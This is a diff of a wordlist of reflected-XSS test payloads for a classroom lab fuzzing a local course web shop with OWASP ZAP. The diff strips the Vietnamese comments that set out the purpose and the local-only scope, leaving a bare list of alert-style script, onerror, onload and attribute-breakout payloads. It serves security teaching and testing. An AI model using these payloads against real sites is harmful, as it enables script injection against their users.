@@ -1,46 +1,17 @@
-# Wordlist payload Reflected XSS - Lab 1 (OWASP ZAP Fuzzer)
-# Bàn giao cho lớp kèm hướng dẫn Lab 1 (seminar/docs/lab-huong-dan.md).
-# Mục đích: NẠP vào ZAP Fuzzer tại tham số search cua EShop (localhost, moi truong hoc tap).
-# CHI dung tren EShop môn học. Moi dong duoi la 1 payload; dong bat dau bang # la chu thich, BO truoc khi nap neu tool khong tu loc.
-#
-# Moi payload dung chuoi nhan dien duy nhat ZAPX<so> de de tim trong response
-# (go "ZAPX" vao o Search cua tab Response - Hint 2 trong Lab).
-#
-# ===================================================================
-# LUU Y QUAN TRONG (da kiem chung tren EShop 17/10):
-# - Endpoint search chay vao  ... WHERE name LIKE '%<payload>%'
-#   -> payload CO dau nhay (') se LAM VO SQL -> tra ve 500 (do la bang chung SQLi, KHONG phai XSS).
-# - De XAC THUC XSS (bung alert), GO payload KHONG CO dau nhay vao o tim kiem roi bam Tim:
-#       <img src=x onerror=alert(document.domain)>
-#       <svg onload=alert(1)>
-#       <img src=x onerror=alert(/ZAPX/)>
-#   SQL khong vo -> Home.jsx render qua dangerouslySetInnerHTML -> onerror/onload chay.
-# - URL ?search=... KHONG dung duoc (app khong doc param tu URL) -> phai GO vao o tim kiem.
-# ===================================================================
-#
-# --- Nhom 0: payload AN TOAN SQL (khong co dau nhay) - dung de XAC THUC XSS trong trinh duyet ---
 <img src=x onerror=alert(document.domain)>
 <svg onload=alert(1)>
 <img src=x onerror=alert(/ZAPX/)>
 "><img src=x onerror=alert(document.domain)>
-#
-# --- Nhom 1: the script co ban (kiem tra output encoding) ---
 <script>alert('ZAPX1')</script>
 <script>alert(String.fromCharCode(90,65,80,88,50))</script>
-# --- Nhom 2: event handler tren the img/svg (khi < > khong bi chan) ---
 "><img src=x onerror=alert('ZAPX3')>
 <img src=x onerror=alert('ZAPX4')>
 <svg onload=alert('ZAPX5')>
 "><svg/onload=alert('ZAPX6')>
-# --- Nhom 3: thoat khoi thuoc tinh (attribute context) ---
 " onmouseover=alert('ZAPX7') x="
 '><script>alert('ZAPX8')</script>
-# --- Nhom 4: the body/iframe ---
 <body onload=alert('ZAPX9')>
 <iframe src="javascript:alert('ZAPX10')"></iframe>
-# --- Nhom 5: bien the hoa/encoding de so sanh truong hop da co filter ---
 <ScRiPt>alert('ZAPX11')</ScRiPt>
 <img src=x onerror=alert('ZAPX12') >
-# --- Nhom 6: chuoi doi chung (KHONG phai XSS) de nhan biet false positive ---
-# Neu chuoi nay phan xa nguyen van thi chi la reflection binh thuong, khong phai lo hong.
 ZAPX13_benign_marker
